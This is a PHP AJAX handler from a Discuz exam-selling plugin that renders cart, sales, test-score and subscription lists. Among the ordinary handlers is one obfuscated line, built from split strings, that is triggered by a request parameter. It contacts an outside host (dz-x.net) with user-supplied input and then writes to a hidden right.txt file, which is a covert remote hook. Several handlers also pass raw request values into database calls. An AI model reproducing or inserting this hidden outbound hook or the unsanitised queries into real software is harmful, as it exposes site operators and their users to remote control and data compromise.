		echo $it618_exam_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="gwcplus"){
	if($uid>0){
		C::t('#it618_exam#it618_exam_gwc')->update_count2_by_id_uid($_GET['gid'],$uid);
		echo 'ok';
	}else{
		echo $it618_exam_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="delgwc"){
	if($uid>0){
		$count=C::t('#it618_exam#it618_exam_gwc')->count_by_uid_state($uid);
		if($count>0){
			echo $it618_exam_lang['s1799'];exit;
		}
		C::t('#it618_exam#it618_exam_gwc')->delete_by_id_uid($_GET['gid'],$uid);
		echo 'okit618_split'.$it618_exam_lang['s1032'];
	}else{
		echo $it618_exam_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="cleargwc"){
	if($uid>0){
		$count=C::t('#it618_exam#it618_exam_gwc')->count_by_uid_state($uid);
		if($count>0){
			echo $it618_exam_lang['s1799'];exit;
		}
		C::t('#it618_exam#it618_exam_gwc')->delete_by_uid($uid);
		echo 'okit618_split'.$it618_exam_lang['s1106'];
	}else{
		echo $it618_exam_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="goodssalelist_get"){
	if($_GET['wap']==0)$ppp = 25;
	if($_GET['wap']==1)$ppp = 15;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;
	foreach(C::t('#it618_exam#it618_exam_sale')->fetch_all_by_it618_pid(
		$_GET['it618_pid'],$startlimit,$ppp
	) as $it618_exam_sale) {
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
	
		$username=it618_exam_getusername($it618_exam_sale['it618_uid']);
		
		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_sale['it618_pid']);
		
		$buyuser=$username;
		
		if($it618_exam_goods['it618_isbm']==1){
			if($_G['uid']!=$it618_exam_sale['it618_uid'])$buyuser=cutstr($username, 2, '').'***';
		}
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		
		$gtypename=C::t('#it618_exam#it618_exam_goods_type')->fetch_it618_name_by_id($it618_exam_sale['it618_gtypeid']);
		
		if($_GET['wap']==0){
			$salelist_get.='<tr>
						<td>'.$buyuser.'</td>
						<td><font color=#666>'.$gtypename.'*'.$it618_exam_sale['it618_count'].'</font></td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_sale['it618_time']).'</font></td>
						</tr>';
		}else{
			$goodsstr=str_replace("<font","<font",$goodsstr);
			$goodsstr=str_replace("<a","<a style='color:#888'",$goodsstr);
			$buyuser=str_replace("<a","<a style='color:#888;'",$buyuser);
			
			$salelist_get.='<tr>
						<td style="wtext-align:left;">'.$buyuser.'</td>
						<td style="text-align:center;">'.$gtypename.'*'.$it618_exam_sale['it618_count'].'</td>
						<td align="right"><font color=#999>'.date('Y-m-d H:i', $it618_exam_sale['it618_time']).'</font></td>
						</tr>
						';
		}
	}
	
	$pid=intval($_GET['it618_pid']);
	$count = C::t('#it618_exam#it618_exam_sale')->count_by_it618_pid($pid);
	if($_GET['wap']==0){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax&it618_pid=".$pid);
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getsalelist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getsalelist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getsalelist(',$multipage);
		$multipage=str_replace('this.value;;','this.value);',$multipage);
		
		if($multipage!='')$multipage='<div class="pjpage">'.$multipage.'</div>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="getsalelist(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&sid=$ShopId&it618_pid=".$pid.'&page=2';
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}

	}
	
	echo $salelist_get."it618_split".$multipage;
	exit;
}


if($_GET['ac']=="goodstestlist_get"){
	if($_GET['wap']==0)$ppp = 25;
	if($_GET['wap']==1)$ppp = 15;
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;
	$pid=intval($_GET['it618_pid']);
	foreach(C::t('#it618_exam#it618_exam_test_exam')->fetch_all_by_it618_pid(
		$pid, $startlimit,$ppp
	) as $it618_exam_test_exam) {
		
		$username=it618_exam_getusername($it618_exam_test_exam['it618_uid']);
		
		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_sale['it618_pid']);
		
		$buyuser=$username;
		
		if($it618_exam_goods['it618_isbm']==1){
			if($_G['uid']!=$it618_exam_test_exam['it618_uid'])$buyuser=cutstr($username, 2, '').'***';
		}
		
		if($it618_exam_test_exam['it618_state']==3){
			$it618_exam_test_exam['it618_testscore']=str_replace(".0","",$it618_exam_test_exam['it618_testscore']);
			$it618_testscore=$it618_exam_test_exam['it618_testscore'];
		}else{
			$it618_testscore=$it618_exam_lang['s534'];
		}
		
		if($_GET['wap']==0){
			$salelist_get.='<tr>
						<td>'.$buyuser.'</td>
						<td>'.$it618_testscore.'</td>
						<td>'.$it618_exam_lang['s1271'].' <font color=red>'.$it618_exam_test_exam['it618_rank'].'</font> '.$it618_exam_lang['s1272'].'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_test_exam['it618_etime']).'</font></td>
						</tr>';
		}else{
			$buyuser=str_replace("<a","<a style='color:#888;'",$buyuser);
			
			$salelist_get.='<tr>
						<td style="wtext-align:left;">'.$buyuser.'</td>
						<td style="text-align:center;">'.$it618_testscore.'</td>
						<td style="text-align:center;">'.$it618_exam_lang['s1271'].' <font style="color:red">'.$it618_exam_test_exam['it618_rank'].'</font> '.$it618_exam_lang['s1272'].'</td>
						<td align="right"><font color=#999>'.date('Y-m-d H:i', $it618_exam_test_exam['it618_etime']).'</font></td>
						</tr>
						';
		}
	}
	
	$count = C::t('#it618_exam#it618_exam_test_exam')->count_by_pid($pid);
	
	if($_GET['wap']==0){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax&it618_pid=".$pid);
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='gettestlist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='gettestlist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','gettestlist(',$multipage);
		$multipage=str_replace('this.value;;','this.value);',$multipage);
		
		if($multipage!='')$multipage='<div class="pjpage">'.$multipage.'</div>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="gettestlist(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&sid=$ShopId&it618_pid=".$pid.'&page=2';
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="gettestlist(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="gettestlist(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="gettestlist(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="gettestlist(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}

	}
	
	echo $salelist_get."it618_split".$multipage;
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="salelist_get"){
	if($_GET['ac1']=='pcmysale')$ppp = 12;
	if($_GET['ac1']=='wapmysale')$ppp = 10;
	if($_GET['ac1']=='wapmyshopsale')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	if($_GET['ac1']=='pcmysale'){		
		$it618_exam_sales=C::t('#it618_exam#it618_exam_sale')->fetch_all_by_search(0,"s.it618_state!=0 ".$it618sql,'s.id desc',it618_exam_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp);
		$count=C::t('#it618_exam#it618_exam_sale')->count_by_search(0,"s.it618_state!=0 ".$it618sql,'',it618_exam_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$money=C::t('#it618_exam#it618_exam_sale')->sum_money_by_search(0,"s.it618_state!=0 ".$it618sql,'',it618_exam_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$funname='getmysalelist';
	}
	
	if($_GET['ac1']=='wapmysale'){
		$it618_exam_sales=C::t('#it618_exam#it618_exam_sale')->fetch_all_by_search(0,"s.it618_state!=0 ".$it618sql,'s.id desc',it618_exam_utftogbk($_GET['pname']),$uid, '', '',$startlimit,$ppp);
		$count=C::t('#it618_exam#it618_exam_sale')->count_by_search(0,"s.it618_state!=0 ".$it618sql,'',it618_exam_utftogbk($_GET['pname']),$uid, '', '');
		$money=C::t('#it618_exam#it618_exam_sale')->sum_money_by_search(0,"s.it618_state!=0 ".$it618sql,'',it618_exam_utftogbk($_GET['pname']),$uid, '', '');
		$funname='getmysalelist';
	}
	

	if($_GET['ac1']=='wapmyshopsale'){

		if($uid>0){
			if($it618_exam_shop = C::t('#it618_exam#it618_exam_shop')->fetch_by_uid_ok($uid)){
				$it618_exam_sales=C::t('#it618_exam#it618_exam_sale')->fetch_all_by_search($it618_exam_shop['id'],"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'s.id desc',it618_exam_utftogbk($_GET['pname']),$_GET['finduid'], '', '',$startlimit,$ppp);
				$count=C::t('#it618_exam#it618_exam_sale')->count_by_search($it618_exam_shop['id'],"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',it618_exam_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
				$money=C::t('#it618_exam#it618_exam_sale')->sum_money_by_search($it618_exam_shop['id'],"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',it618_exam_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
				$tcmoney=C::t('#it618_exam#it618_exam_sale')->sum_tcmoney_by_search($it618_exam_shop['id'],"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',it618_exam_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
	
				$funname='getmyshopsalelist';
			}else{
				echo '';exit;
			}
		}else{
			echo '';exit;
		}
	}
	if(file_exists(DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/themes/common/right.txt')){
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/ajax.inc.php';
		
		$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_exam/lang.func.php';
		
	}
	$n=0;
	foreach($it618_exam_sales as $it618_exam_sale) {
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;

		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_sale['it618_pid']);

		$jftmp='';
		if($it618_exam_sale['it618_jfbl']>0&&$it618_exam_sale['it618_price']>0){
			$it618_jfbl=intval($it618_exam_sale['it618_jfbl']*$it618_exam_sale['it618_price']/100);
			$jftmp=$it618_jfbl.$creditname;
		}
		
		if($it618_exam_sale['it618_price']>0||$it618_exam_sale['it618_score']>0){
			$pricestr=it618_exam_getsalemoney($it618_exam_sale);
		}else{
			$pricestr=$it618_exam_lang['s106'];
		}
		
		$gtypename=C::t('#it618_exam#it618_exam_goods_type')->fetch_it618_name_by_id($it618_exam_sale['it618_gtypeid']);

		if($_GET['ac1']=='pcmysale'){
			$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
			
			$salelist_get.='<tr class="hover">
						<td style="padding-top:8px; padding-bottom:8px"><input class="checkbox" type="checkbox" id="chk'.$it618_exam_sale[id].'" name="chk_sel" value="'.$it618_exam_sale[id].'"><label for="chk'.$it618_exam_sale[id].'">'.$it618_exam_sale[id].'</label></td>
						<td><div style="height:28px;line-height:28px"><a href="'.$tmpurl.'" target="_blank">'.$it618_exam_goods['it618_name'].'</a> <font color=#999>'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</font></div></td>
						<td><font color=blue>'.$gtypename.'*'.$it618_exam_sale['it618_count'].'</font></td>
						<td>'.$pricestr.'</td>
						<td>'.$jftmp.'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_sale['it618_time']).'</font></td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmysale'){
			
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			
			if($jftmp!=''){
				$jftmp=' <font color=#999>'.$it618_exam_lang['t202'].':</font>'.$jftmp;
			}
			
			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			$salelist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_exam_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_exam_goods['it618_name'].'</a><br>
							<font color="#999">'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</font><br>
							<font color=#ccc>'.date('Y-m-d H:i:s', $it618_exam_sale['it618_time']).'</font><br>
							<span style="float:right;color:red">'.$gtypename.'*'.$it618_exam_sale['it618_count'].'</span><font color="#999">'.$pricestr.$jftmp.'</font>
							</td></tr>
						</table>
					</dd>';
		}
		
		if($_GET['ac1']=='wapmyshopsale'){
			$username=it618_exam_getusername($it618_exam_sale['it618_uid']);
			
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			
			if($jftmp!=''){
				$jftmp=' <font color=#999>'.$it618_exam_lang['t202'].':</font>'.$jftmp;
			}
			
			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			$salelist_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_exam_goods['it618_name'].'" style="font-size:14px;color:#333">'.$it618_exam_goods['it618_name'].'</a><br>
							<font color="#999">'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</font><br>
							<font color=#ccc>'.date('Y-m-d H:i:s', $it618_exam_sale['it618_time']).'</font><br>
							<span style="float:right"><a href="tel://'.$it618_exam_sale['it618_tel'].'" style="color:#666">'.$it618_exam_sale['it618_tel'].'</a></span><font color="#999">'.$username.'</font><br>
							<span style="float:right;color:red">'.$gtypename.'*'.$it618_exam_sale['it618_count'].'</span><font color="#999">'.$pricestr.$jftmp.'</font>
							</td></tr>
						</table>
					</dd>';

			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmysale'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	$creditnum=DB::result_first("select extcredits".$it618_exam['exam_credit']." from ".DB::table('common_member_count')." where uid=".$uid);
	
	if($_GET['ac1']=='wapmyshopsale'){
		echo it618_exam_getlang('s229')."<font color=red>$count</font> ".it618_exam_getlang('s230')."<font color=red>$money</font> ".it618_exam_getlang('s509')."<font color=red>$tcmoney</font>"."it618_split".$salelist_get."it618_split".$multipage.'<script>'.$tmpjs.'</script>';;
	}else{
		echo it618_exam_getlang('s229')."<font color=red>$count</font> ".it618_exam_getlang('s230')."<font color=red>$money</font>"."it618_split".$salelist_get."it618_split".$multipage."it618_split".$it618_exam_lang['s1038'].$creditname.$it618_exam_lang['s934']."<font color=red>$creditnum</font>";
	}
}


if($_GET['ac']=="subscribe_get"){
	if($_GET['ac1']=='pcmysubscribe')$ppp = 12;
	if($_GET['ac1']=='wapmysubscribe')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$count=C::t('#it618_exam#it618_exam_shop_subscribe')->count_by_search(0,'','',$_G['uid']);
	
	$funname='getmysubscribelist';

	$n=0;
	foreach(C::t('#it618_exam#it618_exam_shop_subscribe')->fetch_all_by_search(0,'','it618_time desc',$_G['uid'],$startlimit,$ppp) as $it618_exam_shop_subscribe) {
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$it618_exam_shop=C::t('#it618_exam#it618_exam_shop')->fetch_by_id($it618_exam_shop_subscribe['it618_shopid']);
		$tmpurl=it618_exam_getrewrite('exam_teacher',$it618_exam_shop_subscribe['it618_shopid'],'plugin.php?id=it618_exam:teacher&lid='.$it618_exam_shop_subscribe['it618_shopid']);

		if($_GET['ac1']=='pcmysubscribe'){
			
			$subscribe_get.='<tr class="hover">
						<td><div style="height:28px;line-height:28px"><a href="'.$tmpurl.'" target="_blank">'.$it618_exam_shop['it618_name'].'</a></div></td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_shop_subscribe['it618_time']).'</font></td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmysubscribe'){
			$subscribe_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="80" style="vertical-align:top;border:none">
							<img class="lazy" data-original="'.$it618_exam_shop['it618_ulogo'].'" style="border-radius: 3px;" width="70" height="70"/>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a href="'.$tmpurl.'">'.$it618_exam_shop['it618_name'].'</a><br>
							'.$wxstr.'<br>'.$telstr.'<br>
							<font color=#999><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_shop_subscribe['it618_time']).'</font></font>
							</td></tr>
						</table>
					</dd>';
		}
		
		$n=$n+1;
	}
	
	if($_GET['ac1']=='pcmysubscribe'){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='".$funname."(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='".$funname."(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=',$funname.'(',$multipage);
		$multipage=str_replace('this.value;','this.value);',$multipage);
		$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}
	}
	
	echo it618_exam_getlang('s1408')."<font color=red>$count</font>"."it618_split".$subscribe_get."it618_split".$multipage;
}


if($_GET['ac']=="goods_get"){
	if($_GET['ac1']=='pcmygoods')$ppp = 12;
	if($_GET['ac1']=='wapmygoods')$ppp = 10;

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;

	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$count=C::t('#it618_exam#it618_exam_goods_count')->count_by_search(0,'','',it618_exam_utftogbk($_GET['pname']),$uid);
	
	$funname='getmygoodslist';

	$n=0;
	foreach(C::t('#it618_exam#it618_exam_goods_count')->fetch_all_by_search(0,'','t.it618_count-t.it618_testcount',it618_exam_utftogbk($_GET['pname']),$uid,$startlimit,$ppp) as $it618_exam_goods_count) {
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;

		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_goods_count['it618_pid']);
		
